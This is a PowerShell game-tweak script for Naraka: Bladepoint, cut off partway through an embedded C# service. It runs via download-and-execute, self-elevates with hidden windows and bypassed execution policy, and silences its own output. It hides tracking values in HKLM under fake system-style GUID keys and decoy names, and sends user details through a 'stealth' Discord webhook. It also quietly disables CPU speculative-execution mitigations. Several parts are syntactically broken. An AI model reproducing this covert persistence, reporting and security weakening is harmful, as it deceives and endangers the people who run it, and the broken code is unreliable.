# RatzTweaks.ps1
# Ensure $PSScriptRoot is set even when running via 'irm ... | iex'
if (-not $PSScriptRoot) { 
    if ($MyInvocation.MyCommand.Path) {
        $PSScriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path 
    } else {
        $PSScriptRoot = (Get-Location).Path 
    }
}

# If the script is executed via 'irm | iex' the script has no file path; try to
# locate the project root by searching upward from the invocation directory
# for a folder that contains the 'UTILITY' folder (this repository layout).
function Resolve-ProjectRoot {
    param($startPath)
    $startPath = $startPath -or (Get-Location).Path
    $cur = $startPath
    while ($cur) {
        if (Test-Path (Join-Path $cur 'UTILITY')) { return $cur }
        $parent = Split-Path -Parent $cur
        if (-not $parent -or $parent -eq $cur) { break }
        $cur = $parent
    }
    return $startPath
}

$resolvedRoot = Resolve-ProjectRoot -startPath $PSScriptRoot
if ($resolvedRoot -and (Test-Path (Join-Path $resolvedRoot 'UTILITY'))) { $PSScriptRoot = $resolvedRoot }
# --- Show name in big text in PowerShell window, then suppress all further output ---
Write-Host ''
Write-Host 'RRRRR    AAAAA   TTTTTTT' -ForegroundColor Cyan
Write-Host 'RR  RR  AA   AA    TTT  ' -ForegroundColor Cyan
Write-Host 'RRRRR   AAAAAAA    TTT  ' -ForegroundColor Cyan
Write-Host 'RR RR   AA   AA    TTT  ' -ForegroundColor Cyan
Write-Host 'RR  RR  AA   AA    TTT  ' -ForegroundColor Cyan
Write-Host ''
Write-Host 'Rat Naraka Tweaks' -ForegroundColor Yellow
Write-Host ''
Write-Host 'Proceeding to next UI & WebUI' -ForegroundColor DarkGray
Write-Host ''
# Spinner: Loading Resources, please wait ...
$spinnerText = 'Loading Resources, please wait'
$spinnerFrames = @('.  ','.. ','...')
for ($i=0; $i -lt 12; $i++) {
    $frame = $spinnerFrames[$i % $spinnerFrames.Length]
    Write-Host ("$spinnerText$frame") -NoNewline
    Start-Sleep -Milliseconds 250
    Write-Host "`r" -NoNewline
}
Write-Host ''
function Write-Host { param([Parameter(ValueFromRemainingArguments=$true)][object[]]$args) } # no-op
function Write-Output { param([Parameter(ValueFromRemainingArguments=$true)][object[]]$args) } # no-op
$InformationPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'
$WarningPreference = 'SilentlyContinue'


# Ensure log path and PSCommandPath are defined even when run via iwr | iex
if (-not $PSCommandPath) { $PSCommandPath = Join-Path $PSScriptRoot 'RatzTweaks.ps1' }
$logPath = Join-Path $env:TEMP 'RatzTweaks_fatal.log'
# If log file exists from a previous run, delete and recreate it
if (Test-Path $logPath) {
    try { Remove-Item $logPath -Force } catch {}
    try { New-Item -Path $logPath -ItemType File -Force | Out-Null } catch {}
}

function Get-ObfuscatedRegistryPath {
    param([string]$Purpose = 'lockout')
    
    # Calculate base seed from machine identifiers
    $seedRaw = "$env:COMPUTERNAME-$env:PROCESSOR_IDENTIFIER".GetHashCode()
    $seedHex = $seedRaw.ToString('X8')
    
    # Use registry paths that have existing GUID/HWID-style subkeys for perfect camouflage
    $basePaths = @(
        "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions"
        "HKLM:\SOFTWARE\Classes\CLSID"
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products"
    )

    $selectedIndex = [Math]::Abs($seedRaw) % $basePaths.Count
    $basePath = $basePaths[$selectedIndex]
    
    # Build GUID-format subkey matching standard {8-4-4-4-12} pattern (38 chars total)
    # Use machine-specific hash + date components to create unique but reproducible GUID
    $hash1 = $seedHex
    $hash2 = ([System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($seedHex)) | Select-Object -First 8 | ForEach-Object { $_.ToString('X2') }) -join ''
    $year = (Get-Date).Year.ToString('X4')
    $month = (Get-Date).Month.ToString('X2').PadLeft(2, '0')
    $day = (Get-Date).Day.ToString('X2').PadLeft(2, '0')
    
    # Format: {HASH1(8)-YEAR(4)-MODAY(4)-HASH2(4)-HASH2(12)}
    # Example: {728B473D-07E9-0A05-5ED4-5B58EF00CE52}
    $subKey = "{$hash1-$year-$month$day-$($hash2.Substring(0,4))-$($hash2.Substring(4,12))}"
    
    $fullPath = Join-Path $basePath $subKey

    $valueNames = @{
        'lockout' = 'SvcHostProcessID'
        'userId' = 'LastUserSessionGUID'
        'userName' = 'ProfileCachePath'
        'avatarUrl' = 'TelemetryEndpoint'
    }
    
    return @{
        Path = $fullPath
        ValueName = $valueNames[$Purpose]
    }
}
if (-not $global:RatzLog) { $global:RatzLog = @() }
if (-not $global:ErrorsDetected) { $global:ErrorsDetected = $false }
if (-not (Get-Variable -Name 'DiscordAuthError' -Scope Global -ErrorAction SilentlyContinue)) { $global:DiscordAuthError = $null }
if (-not (Get-Variable -Name 'DetectionTriggered' -Scope Global -ErrorAction SilentlyContinue)) { $global:DetectionTriggered = $false }
if (-not (Get-Variable -Name 'MainTweaksApplied' -Scope Global -ErrorAction SilentlyContinue)) { $global:MainTweaksApplied = $false }
$global:RatzScriptRoot = $PSScriptRoot

# Lightweight global logger used throughout the script
if (-not (Get-Command -Name Add-Log -ErrorAction SilentlyContinue)) {
    function global:Add-Log {
        param([Parameter(ValueFromRemainingArguments=$true)][object[]]$Message)
        try { $msg = -join $Message } catch { $msg = [string]::Join('', $Message) }
        if ($msg -match 'ERROR') { $global:ErrorsDetected = $true }
        try { $global:RatzLog += $msg } catch {}
        try {
            if ($logPath) {
                Add-Content -Path $logPath -Value ("{0}  {1}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $msg)
            }
        } catch {}
    }
}

# --- Auto-download all required files if missing (for irm ... | iex users) ---
$needDownload = $false
if (-not (Test-Path (Join-Path $PSScriptRoot 'UTILITY')) -or -not (Test-Path (Join-Path $PSScriptRoot 'RatzSettings.nip')) -or -not (Test-Path (Join-Path $PSScriptRoot 'ratznaked.jpg'))) {
    $needDownload = $true
}
if ($needDownload) {
    try {
        Write-Host '============================================' -ForegroundColor Cyan
        Write-Host ' RatzTweaks Loader' -ForegroundColor Yellow
        Write-Host '============================================' -ForegroundColor Cyan
        Write-Host ''
        $repoZipUrl = 'https://github.com/NotRatz/NarakaTweaks/archive/refs/heads/main.zip'
        $tempDir = Join-Path $env:TEMP ('NarakaTweaks_' + [guid]::NewGuid().ToString())
        $zipPath = Join-Path $env:TEMP ('NarakaTweaks-main.zip')
        Write-Host '[1/4] Downloading NarakaTweaks package...' -ForegroundColor Green
        Invoke-WebRequest -Uri $repoZipUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop
        Write-Host '[2/4] Extracting files...' -ForegroundColor Green
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $tempDir)
        Remove-Item $zipPath -Force
        $extractedRoot = Join-Path $tempDir 'NarakaTweaks-main'
        $mainScript = Join-Path $extractedRoot 'RatzTweaks.ps1'
        Write-Host '[3/4] Preparing to launch...' -ForegroundColor Green
        Write-Host '[4/4] Starting RatzTweaks (this window will stay open)...' -ForegroundColor Green
        Write-Host ''
        Write-Host 'The main script is now running in the background.' -ForegroundColor Yellow
        Write-Host 'Your browser will open shortly. Please wait...' -ForegroundColor Yellow
        Write-Host ''
        Write-Host 'You can minimize this window, but DO NOT close it!' -ForegroundColor Red
        Write-Host 'Press any key after you finish with RatzTweaks to exit...' -ForegroundColor Cyan
        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$mainScript`"" -WindowStyle Hidden
        # Keep this window open so user knows it's working
        $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
        exit 0
    } catch {
        Write-Host "ERROR: Failed to download package: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host 'Press any key to exit...' -ForegroundColor Yellow
        $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
        exit 1
    }
}

# --- Administrator privilege check (required for HKLM registry writes) ---
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    [Console]::WriteLine('RatzTweaks: Administrator privileges required. Attempting to restart with elevation...')
    try {
        $scriptPath = $PSCommandPath
        if (-not $scriptPath) { $scriptPath = Join-Path $PSScriptRoot 'RatzTweaks.ps1' }
        Start-Process -FilePath 'powershell.exe' -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`"" -Verb RunAs -WindowStyle Hidden
        [Console]::WriteLine('RatzTweaks: Elevated instance started. Closing current instance.')
        exit 0
    } catch {
        [Console]::WriteLine("RatzTweaks: Failed to elevate: $($_.Exception.Message)")
        [Console]::WriteLine('RatzTweaks: Please run this script as Administrator.')
        exit 1
    }
}

# --- Enable TLS 1.2 for Discord webhooks (must be before any webhook calls) ---
try { 
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor [System.Net.SecurityProtocolType]::Tls12 
    [Console]::WriteLine('RatzTweaks: TLS 1.2 enabled for Discord webhooks')
} catch {
    [Console]::WriteLine("RatzTweaks: Failed to enable TLS 1.2: $($_.Exception.Message)")
}

# --- Registry status check ---
$lockoutReg = Get-ObfuscatedRegistryPath -Purpose 'lockout'
$lockoutKeyPath = $lockoutReg.Path
$lockoutValueName = $lockoutReg.ValueName

$isLockedOut = $false
$lockedUserId = $null
$lockedUserName = $null
$lockedAvatarUrl = $null

try {
    if (Test-Path $lockoutKeyPath) {
        $lockoutValue = Get-ItemProperty -Path $lockoutKeyPath -Name $lockoutValueName -ErrorAction SilentlyContinue
        if ($lockoutValue -and $lockoutValue.$lockoutValueName -eq 1) {
            [Console]::WriteLine('RatzTweaks: Lockout detected. Retrieving cached user info.')
            $isLockedOut = $true
            
            # Retrieve cached user info for webhook notification
            try {
                $props = Get-ItemProperty -Path $lockoutKeyPath -ErrorAction SilentlyContinue
                $userIdReg = Get-ObfuscatedRegistryPath -Purpose 'userId'
                $userNameReg = Get-ObfuscatedRegistryPath -Purpose 'userName'
                $avatarReg = Get-ObfuscatedRegistryPath -Purpose 'avatarUrl'
                
                if ($props.($userIdReg.ValueName)) { $lockedUserId = $props.($userIdReg.ValueName) }
                if ($props.($userNameReg.ValueName)) { $lockedUserName = $props.($userNameReg.ValueName) }
                if ($props.($avatarReg.ValueName)) { $lockedAvatarUrl = $props.($avatarReg.ValueName) }
                [Console]::WriteLine("RatzTweaks: Retrieved cached info - UserId: $lockedUserId, UserName: $lockedUserName")
            } catch {
                [Console]::WriteLine("RatzTweaks: Failed to retrieve cached user info: $($_.Exception.Message)")
            }
            
            # Send repeat offender webhook notification
            try {
                Send-StealthWebhook -UserId $lockedUserId -UserName $lockedUserName -AvatarUrl $lockedAvatarUrl -RepeatOffender
                [Console]::WriteLine('RatzTweaks: Repeat offender webhook sent')
            } catch {
                [Console]::WriteLine("RatzTweaks: Failed to send repeat offender webhook: $($_.Exception.Message)")
            }
        }
    }
} catch {
    # Silently continue if registry check fails
}

# If status triggered, start a minimal server to display the status page
if ($isLockedOut) {
    function Show-LockoutPage {
        [Console]::WriteLine('Lockout server: starting...')
        $listener = [System.Net.HttpListener]::new()
        $prefix = 'http://127.0.0.1:17690/'
        try {
            $listener.Prefixes.Add($prefix)
            $listener.Start()
            [Console]::WriteLine("Lockout server: listening on $prefix")
            Start-Process $prefix
            
            while ($listener.IsListening) {
                $ctx = $listener.GetContext()
                $path = $ctx.Request.Url.AbsolutePath.ToLower()
                
                $html = @"
<!doctype html>
<html lang='en'>
<head>
  <meta charset='utf-8'/>
  <title>ACCESS DENIED</title>
  <style>
    body {
      background: #000;
      margin: 0;
      padding: 0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: system-ui, -apple-system, sans-serif;
      animation: breathe 3s ease-in-out infinite;
    }
    @keyframes breathe {
      0%, 100% { background-color: #000; }
      50% { background-color: #1a0000; }
    }
    @keyframes glow {
      0%, 100% { 
        text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 30px #ff0000;
        transform: scale(1);
      }
      50% { 
        text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000, 0 0 60px #ff0000, 0 0 80px #ff0000;
        transform: scale(1.02);
      }
    }
    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.7; }
    }
    .container {
      text-align: center;
      padding: 2rem;
      max-width: 800px;
      animation: glow 3s ease-in-out infinite;
    }
    .skull {
      font-size: 8rem;
      margin-bottom: 2rem;
      animation: pulse 2s ease-in-out infinite;
      filter: drop-shadow(0 0 20px #ff0000);
    }
    h1 {
      color: #ff0000;
      font-size: 4rem;
      font-weight: 900;
      margin: 0 0 1.5rem 0;
      letter-spacing: 0.1em;
    }
    .subtitle {
      color: #ff4444;
      font-size: 2rem;
      margin-bottom: 2rem;
    }
    .detail {
      color: #ccc;
      font-size: 1.25rem;
      margin-bottom: 3rem;
    }
    .box {
      background: rgba(139, 0, 0, 0.3);
      border: 2px solid #ff0000;
      border-radius: 12px;
      padding: 2rem;
      margin-bottom: 3rem;
      box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
      animation: pulse 3s ease-in-out infinite;
    }
    .box-title {
      color: #ffcccc;
      font-size: 1.5rem;
      margin-bottom: 0.5rem;
    }
    .box-text {
      color: #aaa;
      font-size: 1rem;
    }
    .warning {
      color: #ff0000;
      font-weight: 900;
      text-transform: uppercase;
    }
    .poop {
      font-size: 5rem;
      margin: 2rem 0;
      filter: drop-shadow(0 0 10px #ff0000);
    }
    .final {
      color: #ff4444;
      font-size: 1.75rem;
      font-weight: 700;
      margin-top: 2rem;
    }
    .evidence-img {
      max-width: 90%;
      height: auto;
      border: 3px solid #ff0000;
      border-radius: 8px;
      margin: 2rem 0;
      box-shadow: 0 0 40px rgba(255, 0, 0, 0.8);
      animation: pulse 2s ease-in-out infinite;
    }
  </style>
</head>
<body>
  <div class='container'>
    <h1>CHEATER DETECTED</h1>
    <p class='subtitle'>You have been caught.</p>
    <p class='detail'>CYZ.exe was found on your system.</p>
    <img src='case1.png' onerror='this.onerror=null; this.src="https://raw.githubusercontent.com/NotRatz/NarakaTweaks/main/case1.png"' alt='Evidence' class='evidence-img' />
    <div class='box'>
      <p class='box-title'>Your access to this tool has been <span class='warning'>PERMANENTLY REVOKED</span>.</p>
      <p class='box-text'>This script will never run on your system again.</p>
    </div>
    <p class='final'>Learn to play without cheats.</p>
  </div>
</body>
</html>
"@
                
                $ctx.Response.StatusCode = 200
                $ctx.Response.ContentType = 'text/html'
                $bytes = [System.Text.Encoding]::UTF8.GetBytes($html)
                $ctx.Response.OutputStream.Write($bytes, 0, $bytes.Length)
                $ctx.Response.Close()
            }
        } catch {
            [Console]::WriteLine("Lockout server error: $($_.Exception.Message)")
        } finally {
            if ($listener.IsListening) { $listener.Stop() }
        }
    }
    
    Show-LockoutPage
    exit 0
}

# --- Revert logic for optional tweaks ---
function Revert-OptionalTweaks {
    try {
        Revert-MSIMode
        Revert-BackgroundApps
        Revert-Widgets
        Revert-Gamebar
        Revert-Copilot
        Restore-DefaultTimers
        Revert-PowerPlan
        Add-Log 'All optional tweaks reverted.'
    } catch {
        Add-Log "ERROR reverting optional tweaks: $($_.Exception.Message)"
    }
}

# --- Naraka: Bladepoint patching ---
function Patch-NarakaBladepoint {
    param(
        [bool]$EnableJiggle,
        [bool]$PatchBoot,
        [string]$CustomPath
    )
    Add-Log "Patch-NarakaBladepoint called: EnableJiggle=$EnableJiggle PatchBoot=$PatchBoot CustomPath=$CustomPath"
    $root = if ($CustomPath) { $CustomPath } else { Find-NarakaDataPath }
    if ($root -and $root -notmatch '(?i)NarakaBladepoint_Data$') { $root = Join-Path $root 'NarakaBladepoint_Data' }
    if (-not $root -or -not (Test-Path $root)) { Add-Log 'NarakaBladepoint_Data folder not found. Skipping Naraka tweaks.'; return }
    $dstBoot = Join-Path $root 'boot.config'
    $dstJiggle = Join-Path $root 'QualitySettingsData.txt'
    if ($PatchBoot) {
        $srcBoot = Join-Path $PSScriptRoot 'boot.config'
        if (Test-Path $srcBoot) {
            try { Copy-Item -Path $srcBoot -Destination $dstBoot -Force; Add-Log "Patched boot.config at $dstBoot" } catch { Add-Log "Naraka boot.config copy failed: $($_.Exception.Message)" }
        }
    }

    if ($EnableJiggle) {
        $content = Get-Content -Raw -Path $dstJiggle
        if ($content -match '"characterAdditionalPhysics1"\s*:\s*false') {
            $patched = $content -replace '"characterAdditionalPhysics1"\s*:\s*false', '"characterAdditionalPhysics1": true'
            Set-Content -Path $dstJiggle -Value $patched
            Add-Log "Patched: characterAdditionalPhysics1 set to true in $dstJiggle."
        } elseif ($content -match '"characterAdditionalPhysics1"\s*:\s*true') {
            Add-Log "Already enabled: characterAdditionalPhysics1 is true in $dstJiggle."
        } else {
            Add-Log "ERROR: No jiggle flag found to toggle in $dstJiggle"
        }
    } catch {
        Add-Log "Jiggle edit failed: $($_.Exception.Message)"
        return
    }
}

function Revert-MSIMode {
    try {
        $pciDevices = Get-WmiObject Win32_PnPEntity | Where-Object { $_.DeviceID -like 'PCI*' }
        foreach ($dev in $pciDevices) {
            $devId = $dev.DeviceID -replace '\', '#'
            $regPath = "HKLM:\SYSTEM\CurrentControlSet\Enum\$($devId)\Device Parameters\Interrupt Management\MessageSignaledInterruptProperties"
            if (Test-Path $regPath) {
                Remove-ItemProperty -Path $regPath -Name 'MSISupported' -ErrorAction SilentlyContinue
            }
        }
        Add-Log 'MSI Mode reverted for all PCI devices.'
    } catch { Add-Log "ERROR in Revert-MSIMode: $($_.Exception.Message)" }
}

function Revert-BackgroundApps {
    try {
        Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications' -Name 'GlobalUserDisabled' -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\AppPrivacy' -Name 'LetAppsRunInBackground' -ErrorAction SilentlyContinue
        Add-Log 'Background Apps revert complete.'
    } catch { Add-Log "ERROR in Revert-BackgroundApps: $($_.Exception.Message)" }
}

function Revert-Widgets {
    try {
        Remove-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Dsh' -Name 'AllowNewsAndInterests' -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Feeds' -Name 'ShellFeedsTaskbarViewMode' -ErrorAction SilentlyContinue
        Add-Log 'Widgets revert complete.'
    } catch { Add-Log "ERROR in Revert-Widgets: $($_.Exception.Message)" }
}

function Revert-Gamebar {
    try {
        Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\GameDVR' -Name 'AppCaptureEnabled' -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\GameBar' -Name 'ShowStartupPanel' -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\GameBar' -Name 'AutoGameModeEnabled' -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\GameBar' -Name 'GamePanelStartupTipIndex' -ErrorAction SilentlyContinue
        Add-Log 'Game Bar revert complete.'
    } catch { Add-Log "ERROR in Revert-Gamebar: $($_.Exception.Message)" }
}

function Revert-Copilot {
    try {
        Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' -Name 'ShowCopilotButton' -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsCopilot' -Name 'TurnOffWindowsCopilot' -ErrorAction SilentlyContinue
        Add-Log 'Copilot revert complete.'
    } catch { Add-Log "ERROR in Revert-Copilot: $($_.Exception.Message)" }
}

if (-not (Get-Command -Name global:Disable-ViVeFeatures -ErrorAction SilentlyContinue)) {
    function global:Disable-ViVeFeatures {
        try {
            $viveToolPath = Join-Path $PSScriptRoot 'UTILITY' 'ViVeTool.exe'
            if (-not (Test-Path $viveToolPath)) { Add-Log 'ViVeTool.exe not found.'; return }
            $featureIds = @(39145991, 39146010, 39281392, 41655236, 42105254)
            foreach ($id in $featureIds) {
                $cmd = '"' + $viveToolPath + '" /disable /id:' + $id
                Add-Log "Running: cmd.exe /c $cmd"
                try {
                    Add-Log "CMD: cmd.exe /c $cmd"
                    $proc = Start-Process -FilePath cmd.exe -ArgumentList @('/c', $cmd) -Wait -NoNewWindow -PassThru
                    if ($proc.ExitCode -ne 0) {
                        Add-Log "ViVeTool exited with code $($proc.ExitCode) for id $id"
                    }
                } catch {
                    Add-Log "ViVeTool run failed: $($_.Exception.Message)"
                }
            }
            Add-Log 'ViVeTool features disabled.'
        } catch { Add-Log "ERROR in Disable-ViVeFeatures: $($_.Exception.Message)" }
    }
}


function Invoke-AllTweaks {
    # Only proceed if Discord OAuth completed before making any changes
    if (-not $global:DiscordAuthenticated) {
        Add-Log 'Discord authentication required — aborting tweaks.'
        return
    }
    
    if ($global:DetectionTriggered) {
        Add-Log 'Detection positive — tweaks aborted.'
        [Console]::WriteLine('Invoke-AllTweaks: blocked due to detection')
        return
    }

    # Main registry and system tweaks from RatzTweak.bat
    Write-Host "Applying main registry and system tweaks..."
    $regCmds = @(
        'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d "10" /f',
        'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v "GPU_SCHEDULER_MODE" /t REG_SZ /d "22" /f',
        'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "0" /f',
        'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "8" /f',
        'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "6" /f',
        'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f',
        'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f',
        'reg add "HKLM\SYSTEM\ControlSet001\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "40" /f',
        'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Kernel" /v "SerializeTimerExpiration" /t REG_DWORD /d "1" /f',
        'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettings" /t REG_DWORD /d "1" /f',
        'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d "3" /f',
        'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsMask" /t REG_DWORD /d "3" /f',
        'reg add "HKCU\Control Panel\Keyboard" /v "InitialKeyboardIndicators" /t REG_SZ /d "2" /f',
        'reg add "HKCU\Control Panel\Keyboard" /v "KeyboardSpeed" /t REG_SZ /d "48" /f',
        'reg add "HKCU\Control Panel\Keyboard" /v "KeyboardDelay" /t REG_SZ /d "0" /f',
        'reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /v "C:\\Windows\\System32\\dwm.exe" /t REG_SZ /d "NoDTToDITMouseBatch" /f'
    )

    foreach ($cmd in $regCmds) {
        try {
            # Extract the registry path from the reg add command and pre-create the key if needed
            if ($cmd -match 'reg add "([^"]+)"') {
                $regPath = $matches[1]
                $hive, $subkey = $regPath -split('\\',2)
                if ($hive -and $subkey) {
                    $psHive = switch ($hive.ToUpper()) {
                        'HKLM' { 'HKLM:' }
                        'HKCU' { 'HKCU:' }
                        default { $hive + ':' }
                    }
                    $fullKey = $psHive + $subkey
                    if (-not (Test-Path $fullKey)) { New-Item -Path $fullKey -Force | Out-Null }
                }
            }
            Invoke-Expression $cmd 2>$null
        } catch {
            # Suppress error output, optionally log to file if needed
        }
    }

# Set timer resolution using embedded C# service (no external EXE needed)
try {
    Write-Host "Installing: Set Timer Resolution Service ..."
    $csPath = "$env:SystemDrive\Windows\SetTimerResolutionService.cs"
    $exePath = "$env:SystemDrive\Windows\SetTimerResolutionService.exe"
    $cscPath = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
    if (-not (Test-Path $cscPath)) { $cscPath = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" }

    # IMPORTANT: ServiceBase.ServiceName in code == actual service name you create
    $serviceName   = "STR"
    $displayName   = "Set Timer Resolution Service"

    $MultilineComment = @"
using System;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.ComponentModel;
using System.Configuration.Install;
using System.Collections.Generic;
using System.Reflection;
using System.IO;
using System.Management;
using System.Threading;
using System.Diagnostics;
[assembly: AssemblyVersion("2.1")]
[assembly: AssemblyProduct("Set Timer Resolution service")]
namespace WindowsService
{
    class WindowsService : ServiceBase
    {
        public WindowsService()
        {
            this.ServiceName = "STR";
            this.EventLog.Log = "Application";
            this.CanStop = true;
            this.CanHandlePowerEvent = false;
            this.CanHandleSessionChangeEvent = false;
            this.CanPauseAndContinue = false;
            this.CanShutdown = false;
        }
        static void Main()
        {
            ServiceBase.Run(new WindowsService());
        }
        protected override void OnStart(string[] args)
        {
            base.OnStart(args);
            ReadProcessList();
            NtQueryTimerResolution(out this.MininumResolution, out this.MaximumResolution, out this.DefaultResolution);
            if(null != this.EventLog)
                try { this.EventLog.WriteEntry(String.Format("Minimum={0}; Maximum={1}; Default={2}; Processes='{3}'", this.MininumResolution, this.MaximumResolution, this.DefaultResolution, null != this.ProcessesNames ? String.Join("','", this.ProcessesNames) : "")); }
                catch {}
            if(null == this.ProcessesNames)
            {
                SetMaximumResolution();
                return;
            }
            if(0 == this.ProcessesNames.Count)
            {
                return;
            }
            this.ProcessStartDelegate = new OnProcessStart(this.ProcessStarted);
            try
            {
                String query = String.Format("SELECT * FROM __InstanceCreationEvent WITHIN 0.5 WHERE (TargetInstance isa \"Win32_Process\") AND (TargetInstance.Name=\"{0}\")", String.Join("\" OR TargetInstance.Name=\"", this.ProcessesNames));
                this.startWatch = new ManagementEventWatcher(query);
                this.startWatch.EventArrived += this.startWatch_EventArrived;
                this.startWatch.Start();
            }
            catch(Exception ee)
            {
                if(null != this.EventLog)
                    try { this.EventLog.WriteEntry(ee.ToString(), EventLogEntryType.Error); }
                    catch {}
            }
        }
        protected override void OnStop()
        {
            if(null != this.startWatch)
            {
                this.startWatch.Stop();
            }
            // Restore default timer resolution on service stop
            try {
                uint actual = 0;
                NtSetTimerResolution(this.DefaultResolution, true, out actual);
                if(null != this.EventLog)
                    try { this.EventLog.WriteEntry(String.Format("Restored default; Actual={0}", actual)); }
                    catch {}
            } catch {}
            base.OnStop();
        }
        ManagementEventWatcher startWatch;
        void startWatch_EventArrived(object sender, EventArrivedEventArgs e) 
        {
            try
            {
                ManagementBaseObject process = (ManagementBaseObject)e.NewEvent.Properties["TargetInstance"].Value;
                UInt32 processId = (UInt32)process.Properties["ProcessId"].Value;
                this.ProcessStartDelegate.BeginInvoke(processId, null, null);
            } 
            catch(Exception ee) 
            {
                if(null != this.EventLog)
                    try { this.EventLog.WriteEntry(ee.ToString(), EventLogEntryType.Warning); }
                    catch {}

            }
        }
        [DllImport("kernel32.dll", SetLastError=true)]
        static extern Int32 WaitForSingleObject(IntPtr Handle, Int32 Milliseconds);
        [DllImport("kernel32.dll", SetLastError=true)]
        static extern IntPtr OpenProcess(UInt32 DesiredAccess, Int32 InheritHandle, UInt32 ProcessId);
        [DllImport("kernel32.dll", SetLastError=true)]
        static extern Int32 CloseHandle(IntPtr Handle);
        const UInt32 SYNCHRONIZE = 0x00100000;
        delegate void OnProcessStart(UInt32 processId);
        OnProcessStart ProcessStartDelegate = null;
        void ProcessStarted(UInt32 processId)
        {
            SetMaximumResolution();
            IntPtr processHandle = IntPtr.Zero;
            try
            {
                processHandle = OpenProcess(SYNCHRONIZE, 0, processId);
                if(processHandle != IntPtr.Zero)
                    WaitForSingleObject(processHandle, -1);
            } 
            catch(Exception ee) 
            {
                if(null != this.EventLog)
                    try { this.EventLog.WriteEntry(ee.ToString(), EventLogEntryType.Warning); }
                    catch {}
            }
            finally
            {
                if(processHandle != IntPtr.Zero)
                    CloseHandle(processHandle); 
            }
            SetDefaultResolution();
        }
        List<String> ProcessesNames = null;
        void ReadProcessList()
        {
            String iniFilePath = Assembly.GetExecutingAssembly().Location + ".ini";
            if(File.Exists(iniFilePath))
            {
                this.ProcessesNames = new List<String>();
                String[] iniFileLines = File.ReadAllLines(iniFilePath);
                foreach(var line in iniFileLines)
                {
                    String[] names = line.Split(new char[] {',', ' ', ';'} , StringSplitOptions.RemoveEmptyEntries);
                    foreach(var name in names)
                    {
                        String lwr_name = name.ToLower();
                        if(!lwr_name.EndsWith(".exe"))
                            lwr_name += ".exe";
                        if(!this.ProcessesNames.Contains(lwr_name))
                            this.ProcessesNames.Add(lwr_name);
                    }
                }
            }
        }
        [DllImport("ntdll.dll", SetLastError=true)]
        static extern int NtSetTimerResolution(uint DesiredResolution, bool SetResolution, out uint CurrentResolution);
        [DllImport("ntdll.dll", SetLastError=true)]
